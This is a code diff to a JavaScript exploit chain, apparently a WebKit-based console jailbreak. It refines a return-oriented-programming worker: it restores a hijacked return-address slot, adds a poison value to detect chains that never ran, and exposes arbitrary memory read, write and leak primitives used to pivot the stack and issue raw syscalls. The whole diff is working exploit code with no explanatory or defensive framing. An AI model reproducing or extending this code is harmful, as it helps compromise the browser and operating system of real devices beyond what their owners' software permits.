@@ -193,7 +193,18 @@ async function prepareRop(p) {
     chain.push(libSceLibcInternalBase.add32(OFFSET_lc_setjmp));
   }
 
+  // Put the worker's real return address back into its parked slot. The hook is
+  // only valid while a chain is staged; leaving it installed while idle means a
+  // spurious wake pivots RSP into a cleared (zeroed) chain buffer and executes
+  // garbage on the worker thread (SIGSEGV / console freeze). The next launch re-arms it.
+  function restoreHook() {
+    p.write8(returnAddress, originalReturnAddress);
+  }
+
   // Launch chain without awaiting worker completion (for blocking syscalls like accept).
+  // NOTE: this path intentionally leaves the hook installed, because the worker
+  // consumes the slot when the pending syscall (accept) completes asynchronously;
+  // net.js restores the chain via waitDetached().
   function launchChainDetached(chain) {
     const originalStackPointer = p.read8(stackPointerSlot);
     chain.push_write8(originalContext, originalReturnAddress);
@@ -236,8 +247,14 @@ async function prepareRop(p) {
       worker.postMessage(0);
     });
 
-    if (!completed)
+    if (!completed) {
+      // Even if the chain is still in flight, restoring the slot is the
+      // correct recovery: the chain epilogue longjmps to this slot and rets
+      // back into the worker's normal park.
+      restoreHook();
       throw new Error(`the rop worker never answered in ${ROP_WAIT_MS / 1000}s - refusing to continue on a chain that never ran. (Reload.)`);
+    }
+    restoreHook();
   }
 
   const runtime = {
@@ -251,6 +268,8 @@ async function prepareRop(p) {
     read1: p.read1,
     readInto: p.readInto,
     writeBytes: p.writeBytes,
+    probeMemoryWindow: p.probeMemoryWindow,
+    memoryWindowSize: p.memoryWindowSize,
     leakval: p.leakval,
     pre_chain: prepareChain,
     launch_chain: launchChain,
@@ -267,12 +286,23 @@ async function prepareRop(p) {
   const chain = new worker_rop(runtime);
 
   const JB_POISON = new int64(0xdeadbeef, 0x00c0ffee);
+
+  // A spurious wake can make the worker fire onmessage without ever running the
+  // staged chain; the payload would then read a stale slot as the syscall
+  // result. Seed the return slot before each launch and refuse the result when
+  // the chain provably never executed.
+  const baseCall = chain.call.bind(chain);
+  chain.call = async function armedCall(rip, rdi, rsi, rdx, rcx, r8, r9) {
+    p.write8(chain.return_value, JB_POISON);
+    const result = await baseCall(rip, rdi, rsi, rdx, rcx, r8, r9);
+    if (result.low == JB_POISON.low && result.hi == JB_POISON.hi) {
+      throw new Error("worker chain did not execute; the return slot still holds the poison marker");
+    }
+    return result;
+  };
+
   p.write8(chain.return_value, JB_POISON);
   const pid = await chain.syscall(SYS_GETPID);
-  if (pid.low == JB_POISON.low && pid.hi == JB_POISON.hi) {
-    throw new Error("Worker chain did not execute; the return slot is unchanged.");
-  }
-
   if (pid.low == 0) {
     throw new Error("WebKit exploit failed.");
   }
